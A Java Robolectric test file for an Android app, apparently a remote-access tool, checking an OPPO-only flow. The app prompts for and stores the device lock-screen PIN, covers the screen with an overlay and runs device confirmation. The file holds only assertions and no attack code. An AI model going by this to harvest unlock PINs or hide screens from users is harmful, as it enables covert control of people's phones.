package com.vendor.rat.integration;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import android.app.Activity;
import android.app.Application;
import android.content.Intent;

import com.vendor.rat.activity.ActivMain;
import com.vendor.rat.activity.ConfirmDeviceActivity;
import com.vendor.rat.activity.LockCredentialPromptActivity;
import com.vendor.rat.credential.FakeLockCredentialCipher;
import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.utils.DeviceUtils;
import com.vendor.rat.utils.SharedUtils;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.robolectric.Robolectric;
import org.robolectric.RobolectricTestRunner;
import org.robolectric.RuntimeEnvironment;
import org.robolectric.Shadows;
import org.robolectric.android.controller.ActivityController;
import org.robolectric.annotation.Config;
import org.robolectric.shadows.ShadowActivity;

/**
 * OPPO Credential-Gated Flow Integration Test
 *
 * Verifies the end-to-end flow:
 * 1. ActivMain gate intercepts onResume on OPPO
 * 2. No PIN → LockCredentialPromptActivity
 * 3. PIN saved → BlockViewHelper.show() + ConfirmDeviceActivity
 * 4. ConfirmDeviceActivity RESULT_OK → markCurrentRunVerified + triggerKeepAlive
 * 5. ConfirmDeviceActivity RESULT_CANCELED → clearAll + suppress + remove overlay
 * 6. Already verified → continue normally (no gate)
 */
@RunWith(RobolectricTestRunner.class)
@Config(sdk = 30, application = Application.class)
public class OppoCredentialGatedFlowTest {

    private ActivityController<ActivMain> controller;
    private ActivMain activity;
    private ShadowActivity shadow;

    @Before
    public void setUp() {
        SharedUtils.init(RuntimeEnvironment.getApplication());
        LockCredentialStore.setCipherForTest(new FakeLockCredentialCipher());
        LockCredentialStore.clearAll();
        DeviceUtils.setBrandForTest("oppo");

        controller = Robolectric.buildActivity(ActivMain.class).create();
 activity = controller.get();
        shadow = Shadows.shadowOf(activity);
    }

    @After
    public void tearDown() {
        DeviceUtils.setBrandForTest(null);
        LockCredentialStore.clearAll();
    }

    // ============ Full flow: No PIN → Prompt → PIN saved → Verify → Success ============

    /**
     * Flow step 1: First resume with no PIN launches prompt.
     */
    @Test
    public void flow_step1_noPinLaunchesPrompt() {
        assertFalse(LockCredentialStore.hasCredential());

        controller.resume();

  ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
     assertNotNull("Should launch prompt", launched);
        assertEquals(LockCredentialPromptActivity.class.getName(),
           launched.intent.getComponent().getClassName());
   assertEquals(ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT, launched.requestCode);
    }

    /**
     * Flow step 2: After prompt OK, starts verification flow.
     */
    @Test
    public void flow_step2_promptOkStartsVerification() {
  // Simulate prompt returning OK (PIN was saved)
        activity.onActivityResult(
                ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
                Activity.RESULT_OK,
          null);

        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
   assertNotNull("Should launch ConfirmDeviceActivity", launched);
        assertEquals(ConfirmDeviceActivity.class.getName(),
              launched.intent.getComponent().getClassName());
        assertEquals(ActivMain.REQUEST_CONFIRM_DEVICE, launched.requestCode);
    }

    /**
     * Flow step 3: PIN stored but not verified → launches ConfirmDeviceActivity.
   */
    @Test
    public void flow_step3_pinStoredLaunchesVerification() {
        LockCredentialStore.savePin("123456");
        assertFalse(LockCredentialStore.isCurrentRunVerified());

 controller.resume();

        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
        assertNotNull("Should launch ConfirmDeviceActivity", launched);
        assertEquals(ConfirmDeviceActivity.class.getName(),
             launched.intent.getComponent().getClassName());
    }

    /**
     * Flow step 4: Verification success → markCurrentRunVerified.
     */
    @Test
    public void flow_step4_verificationSuccessMarksVerified() {
        // Create ConfirmDeviceActivity and simulate RESULT_OK
        Intent launchIntent = new Intent(RuntimeEnvironment.getApplication(), ConfirmDeviceActivity.class);
        launchIntent.putExtra(ConfirmDeviceActivity.EXTRA_EVENT_CODE, "PREPARE_FOR_APP_CONFIRM_LOCK");

  ConfirmDeviceActivity confirmActivity = Robolectric.buildActivity(
      ConfirmDeviceActivity.class, launchIntent).create().get();

        confirmActivity.onActivityResult(1001, Activity.RESULT_OK, null);

        assertTrue("Current run should be verified after RESULT_OK",
       LockCredentialStore.isCurrentRunVerified());
    }

    /**
     * Flow step 5: After verified, resume continues normally (no gate).
     */
    @Test
    public void flow_step5_verifiedResumeContinuesNormally() {
      LockCredentialStore.savePin("123456");
        LockCredentialStore.markCurrentRunVerified();

        controller.resume();

  ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
        assertNull("No credential activity when already verified", launched);
    }

    // ============ Failure path: Cancel → cleanup ============

    /**
  * Failure: Prompt canceled → suppress, no verification.
 */
    @Test
    public void failure_promptCanceled_suppressesAndNoVerification() {
  activity.onActivityResult(
       ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
                Activity.RESULT_CANCELED,
  null);

        assertTrue("Prompt should be suppressed",
  LockCredentialStore.isPromptSuppressedForCurrentRun());
assertFalse("Should not be verified",
      LockCredentialStore.isCurrentRunVerified());
    }

    /**
     * Failure: Verification canceled → clear PIN, suppress, remove overlay.
     */
    @Test
    public void failure_verificationCanceled_clearsPinAndSuppresses() {
        LockCredentialStore.savePin("123456");
        assertTrue(LockCredentialStore.hasCredential());

        Intent launchIntent = new Intent(RuntimeEnvironment.getApplication(), ConfirmDeviceActivity.class);
        launchIntent.putExtra(ConfirmDeviceActivity.EXTRA_EVENT_CODE, "PREPARE_FOR_APP_CONFIRM_LOCK");

        ConfirmDeviceActivity confirmActivity = Robolectric.buildActivity(
         ConfirmDeviceActivity.class, launchIntent).create().get();

    confirmActivity.onActivityResult(1001, Activity.RESULT_CANCELED, null);

        assertFalse("PIN should be cleared after cancel",
                LockCredentialStore.hasCredential());
        assertTrue("Prompt should be suppressed after cancel",
   LockCredentialStore.isPromptSuppressedForCurrentRun());
    }

    // ============ Non-OPPO: gate does not activate ============

    /**
 * Non-OPPO device: no credential gate.
     */
 @Test
    public void nonOppo_noCredentialGate() {
        DeviceUtils.setBrandForTest("samsung");

        controller.resume();

        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
        assertNull("No credential gate on Samsung", launched);
    }

    // ============ Overlay timing ============

    /**
     * Overlay should be shown before ConfirmDeviceActivity launch.
     * (ActivMain.startCredentialVerificationFlow calls BlockViewHelper.show before launching)
     */
    @Test
    public void overlay_shouldBeShownBeforeVerification() {
LockCredentialStore.savePin("123456");
 assertFalse(LockCredentialStore.isCurrentRunVerified());

        controller.resume();

        // ConfirmDeviceActivity should be launched
        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
 assertNotNull("Should launch ConfirmDeviceActivity", launched);
        assertEquals(ConfirmDeviceActivity.class.getName(),
            launched.intent.getComponent().getClassName());

        // BlockViewHelper.show(null) was called in startCredentialVerificationFlow
      // In Robolectric, WindowManager operations may not fully work,
        // but we verify the intent was launched (which happens after show())
    }

    /**
   * After suppression, subsequent resume should not launch gate.
     */
    @Test
    public void suppressed_subsequentResume_shouldNotLaunchGate() {
        // First: cancel prompt to suppress
        activity.onActivityResult(
          ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
      Activity.RESULT_CANCELED,
          null);
        assertTrue(LockCredentialStore.isPromptSuppressedForCurrentRun());

      // Second: resume should not launch anything
        activity.onResume();

        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
        assertNull("No activity should launch when suppressed", launched);
    }
}
